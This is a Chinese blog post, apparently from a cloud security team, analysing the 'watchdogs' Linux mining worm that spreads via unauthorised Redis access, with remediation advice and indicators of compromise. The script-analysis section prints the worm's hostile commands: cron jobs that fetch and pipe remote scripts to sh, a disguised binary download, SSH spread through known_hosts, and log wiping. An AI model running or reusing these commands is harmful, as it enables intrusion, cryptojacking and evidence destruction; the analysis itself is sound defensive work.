@@ -1,0 +1,537 @@
+
+<!DOCTYPE html>
+<html lang="">
+
+
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
+  <meta name="theme-color" content="#202020">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  <script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script>
+  
+  
+    <meta name="keywords" content="挖矿病毒,Linux入侵,Miner,watchdogs,">
+  
+
+  
+    <meta name="description" content="Fooying&#39;s Blog">
+  
+  
+  
+  <link rel="icon" type="image/x-icon" href="/images/footer-logo.png">
+  
+  <title>Linux watchdogs 感染性隐藏挖矿病毒分析 [ Fooying ]</title>
+  
+    <!-- stylesheets list from config.yml -->
+    
+      <link rel="stylesheet" href="//cdn.bootcss.com/pure/1.0.0/pure-min.css">
+    
+      <link rel="stylesheet" href="/css/xoxo.css">
+    
+  
+</head>
+
+
+<body>
+  <div class="nav-container">
+    <nav class="home-menu pure-menu pure-menu-horizontal">
+  <a class="pure-menu-heading" href="/">
+    
+    <span class="title" style="text-transform:none">Fooying</span>
+  </a>
+
+  <ul class="pure-menu-list clearfix">
+      
+          
+            
+              <li class="pure-menu-item"><a href="/" class="pure-menu-link">首页</a></li>
+            
+          
+      
+          
+            
+              <li class="pure-menu-item pure-menu-has-children pure-menu-allow-hover">
+            
+              <a href="#" id="post" class="pure-menu-link">文章</a>
+              <ul class="pure-menu-children">
+              
+                  
+                    <li class="pure-menu-item"><a href="/categories" style="color:#202020;" class="pure-menu-link">分类</a></li>
+                  
+              
+                  
+                    <li class="pure-menu-item"><a href="/archives" style="color:#202020;" class="pure-menu-link">归档</a></li>
+                  
+              
+                  
+                    <li class="pure-menu-item"><a href="/tags" style="color:#202020;" class="pure-menu-link">标签</a></li>
+                  
+              
+              </ul>
+            </li>
+          
+      
+          
+            
+              <li class="pure-menu-item"><a href="/paper" class="pure-menu-link">Papers</a></li>
+            
+          
+      
+          
+            
+              <li class="pure-menu-item"><a href="/project" class="pure-menu-link">项目</a></li>
+            
+          
+      
+          
+            
+              <li class="pure-menu-item"><a href="/activity" class="pure-menu-link">动态</a></li>
+            
+          
+      
+          
+            
+              <li class="pure-menu-item"><a href="/search" class="pure-menu-link">搜索</a></li>
+            
+          
+      
+  </ul>
+   
+</nav>
+
+  </div>
+
+  <div class="container" id="content-outer">
+    <div class="inner" id="content-inner">
+      <div class="post-container">
+  <article class="post" id="post">
+    <header class="post-header text-center">
+      <h1 class="title">
+        Linux watchdogs 感染性隐藏挖矿病毒分析
+      </h1>
+      <span>
+        
+        <time class="time" datetime="2019-02-21T16:08:08.000Z">
+        2019-02-22
+      </time>
+        
+      </span>
+      <span class="slash">/</span>
+      <span class="post-meta">
+      <span class="post-tags">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Linux入侵/">Linux入侵</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Miner/">Miner</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/watchdogs/">watchdogs</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/挖矿病毒/">挖矿病毒</a></li></ul>
+      </span>
+    </span>
+      <span class="slash">/</span>
+      <span class="read">
+      <span id="busuanzi_value_page_pv"></span> 点击
+    </span>
+      <span class="slash">/</span>
+      <span class="read">阅读耗时 21 分钟</span>
+    </header>
+
+    <div class="post-content">
+      <p>作者：笔者及多名同事</p>
+<h3 id="一-背景"><a class="markdownIt-Anchor" href="#一-背景"></a> 一、 背景</h3>
+<p>近日，腾讯云安全团队监测到部分云上及外部用户机器存在安全漏洞被入侵，同时植入 watchdogs 挖矿病毒，出现 crontab 任务异常、系统文件被删除、CPU 异常等情况，并且会自动感染更多机器。攻击者主要利用 Redis 未授权访问入侵服务器并通过内网扫描和 known_hosts 历史登录尝试感染更多机器。</p>
+<p>相对比于过去发现的挖矿病毒，这次的挖矿病毒隐藏性更高，也更难被清理。</p>
+<a id="more"></a>
+<h3 id="二-脚本分析"><a class="markdownIt-Anchor" href="#二-脚本分析"></a> 二、 脚本分析</h3>
+<p>首先，可以直接从crontab任务中看到异常的任务项：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*/15 * * * * (curl -fsSL hxxps://pastebin.com/raw/sByq0rym||wget -q -O- hxxps://pastebin.com/raw/sByq0rym)|sh</span><br></pre></td></tr></table></figure>
+<p>该crontab任务实现从<code>hxxps://pastebin.com/raw/sByq0rym</code>下载shell脚本并执行，shell脚本内容为:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(curl -fsSL hxxps://pastebin.com/raw/tqJjUD9d||wget -q -O hxxps://pastebin.com/raw/tqJjUD9d)|base64 -d|sh</span><br></pre></td></tr></table></figure>
+<p>该脚本实现从<code>hxxps://pastebin.com/raw/tqJjUD9d</code>下载文件，文件内容为经过base64编码处理;</p>
+<img width="500px" src="/images/post/linux-watchdogs-miner-analysis/doc_image_0_w2020_h1210.jpg">
+<p>base64解码后为shell脚本，shell脚本主要功能如下：</p>
+<ol>
+<li>修改环境变量，将常见的可执行文件目录添加到系统路径中，确保脚本中的shell命令正常执行；同时再次覆写crontab任务。</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">export PATH=$PATH:/bin:/usr/bin:/sbin:/usr/local/bin:/usr/sbin</span><br><span class="line">echo &quot;*/10 * * * * (curl -fsSL https://pastebin.com/raw/sByq0rym||wget -q -O- https://pastebin.com/raw/sByq0rym)|sh&quot; | crontab -</span><br></pre></td></tr></table></figure>
+<ol start="2">
+<li>清理其他恶意程序，如<code>kworkerds</code>、<code>ddgs</code>等挖矿程序；同时通过<code>chattr -i</code>等命令解锁和清理相关系统文件</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">psauxf | grep -v grep | grep hwlh3wlh44lh | awk &apos;&#123;print $2&#125;&apos; | xargs kill -9</span><br><span class="line">psauxf | grep -v grep | grep Circle_MI | awk &apos;&#123;print $2&#125;&apos; | xargs kill -9</span><br><span class="line">psauxf | grep -v grep | grep get.bi-chi.com | awk &apos;&#123;print $2&#125;&apos; | xargs kill -9</span><br><span class="line">psauxf | grep -v grep | grep hashvault.pro | awk &apos;&#123;print $2&#125;&apos; | xargs kill -9</span><br><span class="line">psauxf | grep -v grep | grep nanopool.org | awk &apos;&#123;print $2&#125;&apos; | xargs kill -9</span><br><span class="line">psauxf | grep -v grep | grep /usr/bin/.sshd | awk &apos;&#123;print $2&#125;&apos; | xargs kill -9</span><br><span class="line">psauxf | grep -v grep | grep /usr/bin/bsd-port | awk &apos;&#123;print $2&#125;&apos; | xargs kill -9</span><br><span class="line">psauxf|grep -v grep|grep &quot;xmr&quot; | awk &apos;&#123;print $2&#125;&apos;|xargs kill -9</span><br><span class="line">psauxf|grep -v grep|grep &quot;xig&quot; | awk &apos;&#123;print $2&#125;&apos;|xargs kill -9</span><br><span class="line">psauxf|grep -v grep|grep &quot;ddgs&quot; | awk &apos;&#123;print $2&#125;&apos;|xargs kill -9</span><br><span class="line">psauxf|grep -v grep|grep &quot;qW3xT&quot; | awk &apos;&#123;print $2&#125;&apos;|xargs kill -9</span><br><span class="line">psauxf|grep -v grep|grep &quot;wnTKYg&quot; | awk &apos;&#123;print $2&#125;&apos;|xargs kill -9</span><br><span class="line">psauxf|grep -v grep|grep &quot;t00ls.ru&quot; | awk &apos;&#123;print $2&#125;&apos;|xargs kill -9</span><br><span class="line">psauxf|grep -v grep|grep &quot;sustes&quot; | awk &apos;&#123;print $2&#125;&apos;|xargs kill -9</span><br><span class="line">psauxf|grep -v grep|grep &quot;thisxxs&quot; | awk &apos;&#123;print $2&#125;&apos; | xargs kill -9</span><br><span class="line">psauxf|grep -v grep|grep &quot;hashfish&quot; | awk &apos;&#123;print $2&#125;&apos;|xargs kill -9</span><br><span class="line">psauxf|grep-v grep|grep &quot;kworkerds&quot; | awk &apos;&#123;print $2&#125;&apos;|xargs kill -9</span><br><span class="line">chattr -i /etc/cron.d/root</span><br><span class="line">chattr -i /etc/cron.d/system</span><br><span class="line">chattr -i /etc/ld.so.preload</span><br><span class="line">chattr -i /etc/cron.d/apache</span><br><span class="line">chattr -i /var/spool/cron/root</span><br><span class="line">chattr -i /var/spool/cron/crontabs/root</span><br><span class="line">chattr -i /usr/local/bin/dns</span><br><span class="line">chattr -i /usr/sbin/netdns</span><br><span class="line">chattr -i /bin/netstat</span><br><span class="line">rm -rf /etc/cron.d/system /etc/cron.d/apache /etc/cron.hourly/oanacron /etc/cron.daily/oanacron /etc/cron.monthly/oanacron /usr/local/lib/libntp.so /etc/init.d/netdns /etc/init.d/kworker /bin/httpdns /usr/local/bin/dns /bin/netstat /usr/sbin/netdns</span><br><span class="line">chkconfig --del kworker</span><br><span class="line">chkconfig --del netdns</span><br><span class="line">p=$(psauxf|grep -v grep|grepksoftirqds|wc -l)</span><br><span class="line"></span><br><span class="line">if [ $&#123;p&#125; -eq0 ];then</span><br><span class="line">psauxf|grep -v grep | awk &apos;&#123;if($3&gt;=80.0) print $2&#125;&apos;| xargs kill -9</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">if [ -e &quot;/tmp/gates.lod&quot; ]; then</span><br><span class="line">rm -rf $(readlink /proc/$(cat /tmp/gates.lod)/exe)</span><br><span class="line">    kill -9 $(cat /tmp/gates.lod)</span><br><span class="line">rm -rf $(readlink /proc/$(cat /tmp/moni.lod)/exe)</span><br><span class="line">    kill -9 $(cat /tmp/moni.lod)</span><br><span class="line">rm -rf /tmp/&#123;gates,moni&#125;.lod</span><br><span class="line">fi</span><br></pre></td></tr></table></figure>
+<ol start="3">
+<li>根据系统信息下载对应恶意程序执行；黑客主要通过将恶意程序伪装成图片上传到<code>hxxp://thyrsi.com</code>图床站点，shell脚本下载<code>hxxp://thyrsi.com/t6/672/1550667515x1822611209.jpg</code>保存为<code>/tmp/watchdogs</code>文件，赋予可执行权限后执行该恶意程序；</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">if [ ! -f &quot;/tmp/.lsdpid&quot; ]; then</span><br><span class="line">    ARCH=$(uname -m)</span><br><span class="line">    if [ $&#123;ARCH&#125;x = &quot;x86_64x&quot; ]; then</span><br><span class="line">        (curl -fsSL http://thyrsi.com/t6/672/1550667479x1822611209.jpg -o /tmp/watchdogs||wget -q http://thyrsi.com/t6/672/1550667479x1822611209.jpg -O /tmp/watchdogs) &amp;&amp;chmod +x /tmp/watchdogs</span><br><span class="line">elif [ $&#123;ARCH&#125;x = &quot;i686x&quot; ]; then</span><br><span class="line">        (curl -fsSL http://thyrsi.com/t6/672/1550667515x1822611209.jpg -o /tmp/watchdogs||wget -q http://thyrsi.com/t6/672/1550667515x1822611209.jpg -O /tmp/watchdogs) &amp;&amp;chmod +x /tmp/watchdogs</span><br><span class="line">    else</span><br><span class="line">        (curl -fsSL http://thyrsi.com/t6/672/1550667515x1822611209.jpg -o /tmp/watchdogs||wget -q http://thyrsi.com/t6/672/1550667515x1822611209.jpg -O /tmp/watchdogs) &amp;&amp;chmod +x /tmp/watchdogs</span><br><span class="line">    fi</span><br><span class="line">nohup /tmp/watchdogs &gt;/dev/null 2&gt;&amp;1 &amp;</span><br><span class="line">elif[ ! -f &quot;/proc/$(cat /tmp/.lsdpid)/stat&quot; ]; then</span><br><span class="line">    ARCH=$(uname -m)</span><br><span class="line">    if [ $&#123;ARCH&#125;x = &quot;x86_64x&quot; ]; then</span><br><span class="line">        (curl -fsSL http://thyrsi.com/t6/672/1550667479x1822611209.jpg -o /tmp/watchdogs||wget -q http://thyrsi.com/t6/672/1550667479x1822611209.jpg -O /tmp/watchdogs) &amp;&amp;chmod +x /tmp/watchdogs</span><br><span class="line">elif [ $&#123;ARCH&#125;x = &quot;i686x&quot; ]; then</span><br><span class="line">        (curl -fsSL http://thyrsi.com/t6/672/1550667515x1822611209.jpg -o /tmp/watchdogs||wget -q http://thyrsi.com/t6/672/1550667515x1822611209.jpg -O /tmp/watchdogs) &amp;&amp;chmod +x /tmp/watchdogs</span><br><span class="line">    else</span><br><span class="line">        (curl -fsSL http://thyrsi.com/t6/672/1550667515x1822611209.jpg -o /tmp/watchdogs||wget -q http://thyrsi.com/t6/672/1550667515x1822611209.jpg -O /tmp/watchdogs) &amp;&amp;chmod +x /tmp/watchdogs</span><br><span class="line">    fi</span><br><span class="line">nohup /tmp/watchdogs &gt;/dev/null 2&gt;&amp;1 &amp;</span><br><span class="line">fi</span><br></pre></td></tr></table></figure>
+<ol start="4">
+<li>再进一步横向扩展感染，检查本地 ssh 凭证，遍历<code>/root/.ssh/known_hosts</code>文件中的IP地址，利用默认公钥认证方式进行SSH连接，执行恶意命令横向扩展感染；</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if [ -f /root/.ssh/known_hosts ] &amp;&amp; [ -f /root/.ssh/id_rsa.pub ]; then</span><br><span class="line">for h in $(grep -oE &quot;\b([0-9]&#123;1,3&#125;\.)&#123;3&#125;[0-9]&#123;1,3&#125;\b&quot; /root/.ssh/known_hosts); do ssh -oBatchMode=yes -oConnectTimeout=5 -oStrictHostKeyChecking=no $h &apos;(curl -fsSL https://pastebin.com/raw/sByq0rym||wget -q -O- https://pastebin.com/raw/sByq0rym)|sh &gt;/dev/null 2&gt;&amp;1 &amp;&apos; &amp; done</span><br><span class="line">fi</span><br></pre></td></tr></table></figure>
+<ol start="5">
+<li>最后清空系统日志等文件，清理入侵痕迹。</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">echo 0&gt;/root/.ssh/authorized_keys</span><br><span class="line">echo 0&gt;/var/spool/mail/root</span><br><span class="line">echo 0&gt;/var/log/wtmp</span><br><span class="line">echo 0&gt;/var/log/secure</span><br><span class="line">echo 0&gt;/var/log/cron</span><br></pre></td></tr></table></figure>
+<p>通过bash脚本我们可以得知关键文件为其中的<code>watchdogs</code>文件。</p>
+<p>进一步通过Top命令未见异常进程，而CPU空闲率为100%，但又明显感觉到机器运行迟缓。</p>
+<img width="500px" src="/images/post/linux-watchdogs-miner-analysis/doc_image_1_w1268_h304.jpg">
+<p>进一步通过vmstat进行确认，可以发现CPU使用率95%以上，由于可以推断存在隐藏进程，并且hook了相关read等方法，具体案例我们在以前的文章已经做过分析[具体可见《Linux 遭入侵，挖矿进程被隐藏案例分析》].</p>
+<img width="500px" src="/images/post/linux-watchdogs-miner-analysis/doc_image_2_w1270_h75.jpg">
+<p>进一步分析watchdogs文件，可以清楚看到病毒释放了<code>/usr/local/lib/libioset.so</code>的动态链接库并将路径写入<code>/etc/ld.so.preload</code>来实现了进程的隐藏，与我们上面的推测是一致的。具体可见样本分析部分。</p>
+<h3 id="样本分析"><a class="markdownIt-Anchor" href="#样本分析"></a> 样本分析</h3>
+<h4 id="watchdogs"><a class="markdownIt-Anchor" href="#watchdogs"></a> watchdogs</h4>
+<p>主要功能：</p>
+<p>1、获取当前进程id，写入<code>/tmp/.lsdpid</code>文件</p>
+<img src="/images/post/linux-watchdogs-miner-analysis/doc_image_3_w324_h475.jpg">
+<p>2、拷贝<code>/tmp/watchdogs</code>至<code>/usr/sbin/watchdogs</code>目录，并将watchdogs添加至启动项及服务项</p>
+<img src="/images/post/linux-watchdogs-miner-analysis/doc_image_4_w397_h117.jpg">
+<img src="/images/post/linux-watchdogs-miner-analysis/doc_image_5_w382_h81.jpg">
+<p>3、释放<code>libioset.so</code>文件至<code>/usr/local/lib/libioset.so</code>，并将该so文件路径写入<code>/etc/ld.so.preload</code>，同时删除<code>/usr/local/lib/libioset.c</code>文件</p>
+<img src="/images/post/linux-watchdogs-miner-analysis/doc_image_6_w245_h210.jpg">
+<p>4、访问<code>ident.me</code>获取机器IP</p>
+<img src="/images/post/linux-watchdogs-miner-analysis/doc_image_7_w280_h91.jpg">
+<p>5、设置定时任务，定时从<code>hxxps://pastebin.com/raw/sByq0rym</code>上获取shell执行脚本</p>
+<img src="/images/post/linux-watchdogs-miner-analysis/doc_image_8_w394_h400.jpg">
+<p>6、写入<code>/tmp/ksoftirqds</code>、<code>/tmp/config.json</code>，执行<code>ksoftirqds</code>后删除</p>
+<img src="/images/post/linux-watchdogs-miner-analysis/doc_image_9_w309_h130.jpg">
+<img src="/images/post/linux-watchdogs-miner-analysis/doc_image_10_w267_h229.jpg">
+<img src="/images/post/linux-watchdogs-miner-analysis/doc_image_11_w247_h112.jpg">
+<p>7、删除生成的相关文件</p>
+<img src="/images/post/linux-watchdogs-miner-analysis/doc_image_12_w346_h387.jpg">
+<p>8、访问<code>hxxps://pastebin.com/raw/C4ZhQFrH</code>，检查更新</p>
+<img src="/images/post/linux-watchdogs-miner-analysis/doc_image_13_w315_h40.jpg">
+<img src="/images/post/linux-watchdogs-miner-analysis/doc_image_14_w432_h82.jpg">
+<h4 id="libiosetso"><a class="markdownIt-Anchor" href="#libiosetso"></a> <a href="http://libioset.so" target="_blank" rel="noopener">libioset.so</a></h4>
+<p>64位程序中，恶意样本会释放出<code>libioset.c</code>文件，采用源码编译的方式生成<code>libioset.so</code>文件，而32位程序则直接释放出<code>libioset.so</code>文件</p>
+<img src="/images/post/linux-watchdogs-miner-analysis/doc_image_15_w303_h173.jpg">
+<img src="/images/post/linux-watchdogs-miner-analysis/doc_image_16_w497_h177.jpg">
+<p><code>libioset.so</code>主要功能为Hook删除、查看等系统命令函数，过滤掉watchdogs等相关信息，导致ls、rm等命令对该恶意程序无效，该so文件导出函数如下所示</p>
+<img src="/images/post/linux-watchdogs-miner-analysis/doc_image_17_w439_h399.jpg">
+<p>例如，<code>readdir64</code>函数中，加载了<code>libc.so.6</code></p>
+<img src="/images/post/linux-watchdogs-miner-analysis/doc_image_18_w384_h156.jpg">
+<p>获取原始函数地址</p>
+<img src="/images/post/linux-watchdogs-miner-analysis/doc_image_19_w522_h66.jpg">
+<p>如果调用该函数的进程不是ksoftirqds或watchdogs，则过滤掉所有包含恶意程序相关的结果。</p>
+<img src="/images/post/linux-watchdogs-miner-analysis/doc_image_20_w422_h75.jpg">
+<p>Unlink函数同样进行了过滤，导致无法清除恶意程序相关的<code>LD_PRELOAD</code>、<code>libioset.so</code>等</p>
+<p>该恶意程序同样隐藏了CPU信息和网络连接信息，如下所示</p>
+<img src="/images/post/linux-watchdogs-miner-analysis/doc_image_21_w521_h115.jpg">
+<p>当调用<code>fopen</code>打开<code>/proc/stat</code>时，返回伪造的信息</p>
+<img src="/images/post/linux-watchdogs-miner-analysis/doc_image_22_w839_h248.jpg">
+<p>当调用<code>fopen</code>打开<code>/proc/net/tcp</code>或<code>/proc/net/tcp6</code>时，同样进行过滤</p>
+<img src="/images/post/linux-watchdogs-miner-analysis/doc_image_23_w546_h145.jpg">
+<h3 id="三-入侵流程"><a class="markdownIt-Anchor" href="#三-入侵流程"></a> 三、入侵流程</h3>
+<img src="/images/post/linux-watchdogs-miner-analysis/1550839529_45_w3186_h1566.png">
+<p>基于上面的脚本和ELF样本分析可以发现整体入侵和感染流程大概为：</p>
+<ul>
+<li>通过Redis未授权访问漏洞入侵机器并修改crontab任务；或者通过遍历<code>known_hosts</code>中的连接历史进行横向扩展</li>
+<li>crontab任务执行bansh脚本，进行相关清理和下载执行恶意程序<code>watchdogs</code>并横向扩展
+<ul>
+<li>覆写crontab任务</li>
+<li>清理其他恶意程序</li>
+<li>解锁删除相关系统文件</li>
+<li>下载执行watchdogs</li>
+<li>横向扫描其他机器</li>
+<li>清理相关文件和痕迹</li>
+</ul>
+</li>
+<li>watchdogs执行实现写开机启动、服务项并释放动态链接库实现隐藏，同时释放执行挖矿程序
+<ul>
+<li>获取进程ID写<code>/tmp/.lsdpid</code></li>
+<li>将/tmp目录下的watchdogs复制到/usr/sbin/目录并加入开机启动项和服务项</li>
+<li>释放libioset.so并写入/etc/ld.so.preload实现进程等隐藏</li>
+<li>访问idenet.me获取机器外网IP</li>
+<li>再次覆写crontab任务</li>
+<li>释放挖矿程序ksoftirqds和配置文件config.json并执行</li>
+<li>删除相关生成的文件并检查更新</li>
+</ul>
+</li>
+</ul>
+<p>最终完成了一个漏洞利用到植入挖矿程序，同时隐藏和横向感染的过程。</p>
+<p>而相对与过去我们分析过的隐藏进行的挖矿病毒，在该病毒释放的动态链接库中同步对<code>unlink</code>函数进行了过滤，过滤名称同时包含<code>ld.so.preload</code>和<code>libioset.so</code>，而同时由于删除、查看等系统命令函数也受过滤影响，就导致通过常规自动自带的方法无法直接删除<code>libioset.so</code>或者修改<code>ld.so.preload</code>接触恶意进程的隐藏，只能通过<code>busybox</code>来实现对这些文件的删除清理。</p>
+<p>在我们<code>将/usr/local/lib/libioset.so</code>文件清理后，就可以通过<code>top</code>命令看到执行的挖矿进程。</p>
+<img src="/images/post/linux-watchdogs-miner-analysis/doc_image_25_w554_h170.jpg">
+<p>通过捕获的钱包地址查看黑客收益：</p>
+<img src="/images/post/linux-watchdogs-miner-analysis/doc_image_26_w1092_h226.jpg">
+<p>该钱包总收益约为56.5门罗币，约合1.9万人民币，过去24小时内收益1.3门罗币，当前算力约为430KH/S。</p>
+<h3 id="四-修复建议和清理方法"><a class="markdownIt-Anchor" href="#四-修复建议和清理方法"></a> 四、修复建议和清理方法</h3>
+<h4 id="修复建议"><a class="markdownIt-Anchor" href="#修复建议"></a> 修复建议</h4>
+<h5 id="redis未授权访问"><a class="markdownIt-Anchor" href="#redis未授权访问"></a> Redis未授权访问</h5>
+<ul>
+<li>为 Redis 添加密码验证（重启Redis才能生效）</li>
+<li>禁止外网访问 Redis（重启Redis才能生效）</li>
+<li>以低权限运行Redis服务（重启Redis才能生效）详细操作请参考：<a href="http://bbs.qcloud.com/thread-30706-1-1.html" target="_blank" rel="noopener">http://bbs.qcloud.com/thread-30706-1-1.html</a></li>
+</ul>
+<h5 id="内网感染"><a class="markdownIt-Anchor" href="#内网感染"></a> 内网感染</h5>
+<ul>
+<li>建议不要将连接机器的私钥直接放在服务器上，如有必要建议添加密码</li>
+<li>建议通过有限的机器作为跳板机实现对其他内网机器的访问，避免所有机器的随意互联互通，跳板机不要部署相关可能存在风险的服务和业务；</li>
+</ul>
+<h4 id="挖矿木马清理方法"><a class="markdownIt-Anchor" href="#挖矿木马清理方法"></a> 挖矿木马清理方法</h4>
+<ul>
+<li>删除恶意动态链接库<code>/usr/local/lib/libioset.so</code></li>
+<li>排查清理<code>/etc/ld.so.preload</code>中是否加载1中的恶意动态链接库</li>
+<li>清理<code>crontab</code>异常项，删除恶意任务(无法修改则先执行5-a)</li>
+<li>kill 挖矿进程</li>
+<li>排查清理可能残留的恶意文件
+<ul>
+<li><code>chattr -i /usr/sbin/watchdogs /etc/init.d/watchdogs /var/spool/cron/root /etc/cron.d/root</code></li>
+<li><code>chkconfig watchdogs off</code></li>
+<li><code>rm -f /usr/sbin/watchdogs /etc/init.d/watchdogs</code></li>
+</ul>
+</li>
+<li>相关系统命令可能被病毒删除，可通过包管理器重新安装或者其他机器拷贝恢复</li>
+<li>由于文件只读且相关命令被hook，需要安装busybox通过busybox rm命令删除</li>
+<li>部分操作需要重启机器生效</li>
+</ul>
+<h3 id="五-附录"><a class="markdownIt-Anchor" href="#五-附录"></a> 五、附录</h3>
+<h4 id="iocs"><a class="markdownIt-Anchor" href="#iocs"></a> IOCs</h4>
+<h5 id="样本"><a class="markdownIt-Anchor" href="#样本"></a> 样本</h5>
+<ul>
+<li>aee3a19beb22527a1e0feac76344894c</li>
+<li>c79db2e3598b49157a8f91b789420fb6</li>
+<li>d6a146161ec201f9b3f20fbfd528f901</li>
+<li>39fa886dd1af5e5360f36afa42ff7b4e</li>
+</ul>
+<h5 id="矿池地址"><a class="markdownIt-Anchor" href="#矿池地址"></a> 矿池地址</h5>
+<ul>
+<li><a href="http://xmr.f2pool.com:13531" target="_blank" rel="noopener">xmr.f2pool.com:13531</a></li>
+</ul>
+<h5 id="钱包地址"><a class="markdownIt-Anchor" href="#钱包地址"></a> 钱包地址</h5>
+<ul>
+<li>46FtfupUcayUCqG7Xs7YHREgp4GW3CGvLN4aHiggaYd75WvHM74Tpg1FVEM8fFHFYDSabM3rPpNApEBY4Q4wcEMd3BM4Ava.teny</li>
+</ul>
+<h5 id="urls"><a class="markdownIt-Anchor" href="#urls"></a> URLs</h5>
+<ul>
+<li>hxxps://pastebin.com/raw/sByq0rym</li>
+<li>hxxps://pastebin.com/raw/tqJjUD9d</li>
+<li>hxxp://thyrsi.com/t6/672/1550667515x1822611209.jpg</li>
+<li>hxxp://ident.me</li>
+</ul>
+<h4 id="相关链接"><a class="markdownIt-Anchor" href="#相关链接"></a> 相关链接</h4>
+<ul>
+<li><a href="https://mp.weixin.qq.com/s/1AF5cgo_hJ096LmX7ZHitA" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/1AF5cgo_hJ096LmX7ZHitA</a></li>
+</ul>
+
+    </div>
+
+  </article>
+  <div class="toc-container">
+    
+  <div id="toc" class="toc-article">
+    <strong class="toc-title">目录</strong>
+    <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#一-背景"><span class="toc-text"> 一、 背景</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#二-脚本分析"><span class="toc-text"> 二、 脚本分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#样本分析"><span class="toc-text"> 样本分析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#watchdogs"><span class="toc-text"> watchdogs</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#libiosetso"><span class="toc-text"> libioset.so</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#三-入侵流程"><span class="toc-text"> 三、入侵流程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#四-修复建议和清理方法"><span class="toc-text"> 四、修复建议和清理方法</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#修复建议"><span class="toc-text"> 修复建议</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#redis未授权访问"><span class="toc-text"> Redis未授权访问</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#内网感染"><span class="toc-text"> 内网感染</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#挖矿木马清理方法"><span class="toc-text"> 挖矿木马清理方法</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#五-附录"><span class="toc-text"> 五、附录</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#iocs"><span class="toc-text"> IOCs</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#样本"><span class="toc-text"> 样本</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#矿池地址"><span class="toc-text"> 矿池地址</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#钱包地址"><span class="toc-text"> 钱包地址</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#urls"><span class="toc-text"> URLs</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#相关链接"><span class="toc-text"> 相关链接</span></a></li></ol></li></ol>
+  </div>
+
+
+  </div>
+</div>
+<div class="copyright">
+    <span>本作品采用</span>
+    <a href="https://creativecommons.org/licenses/by/4.0/">知识共享署名 4.0 国际许可协议</a>
+    <span>进行许可。 转载时请注明原文链接。</span>
+</div>
+
+
+  
+    <div class="post-nav">
+      <div class="post-nav-item post-nav-next">
+        
+          <span>〈 </span>
+          <a href="/common_vulnerability_management_and_scap/" rel="next" title="通用漏洞管理与SCAP">
+          通用漏洞管理与SCAP
+          </a>
+        
+      </div>
+  
+      <div class="post-nav-item post-nav-prev">
+          
+      </div>
+    </div>
+  
+
